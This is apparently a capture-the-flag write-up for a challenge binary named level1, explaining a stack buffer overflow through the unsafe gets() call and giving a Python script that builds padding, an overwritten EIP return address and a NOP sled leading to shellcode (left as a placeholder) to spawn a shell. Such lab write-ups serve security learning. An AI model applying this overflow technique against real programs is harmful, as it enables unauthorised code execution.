We can see a binary called level1 in the home

After an execution of this, we can see that it's waiting for an entry, then nothing
after an enter pressed.

Let's open it with gdb.

gets is reputed for its bufferoverflow security exploit.

Let's try a bufferoverflow and override EIP which is the register which handle
the next instruction to execute to a shellcode which will help us to execute
a sh.

 1 : create the exploit printer

#!/usr/bin/python
pad = "\x41" * (92 - 4 * 4)
eip = "\x10\xf7\xff\xbf"
shellcode = (SHELLCODE)
NOP = "\x90" * 100
print pad + eip + NOP + shellcode

This exploit will write A until the EIP address.
We must override the EIP address with the direct following address of the location of EIP.
The next instruction which will be read will be the NOP then the shellcode.
